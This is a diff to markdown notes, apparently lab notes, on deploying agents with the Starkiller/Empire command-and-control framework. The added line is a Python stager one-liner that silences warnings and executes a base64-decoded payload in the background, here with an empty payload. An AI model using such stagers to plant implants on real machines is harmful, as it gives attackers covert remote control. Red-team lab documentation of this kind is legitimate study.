@@ -89,6 +89,7 @@ cd /opt/starkiller/
 
 ![[Pasted image 20240123204357.png]]
 
+`echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode(''));" | python3 &`
 ### Agent Interaction - Ensure communication works properly 
 
 1. Click on the chain icon on the left navigation window to bring up the Agents dashboard. Your new agent will get assigned a randomly generated name. On the dashboard you will see important information about your agent:
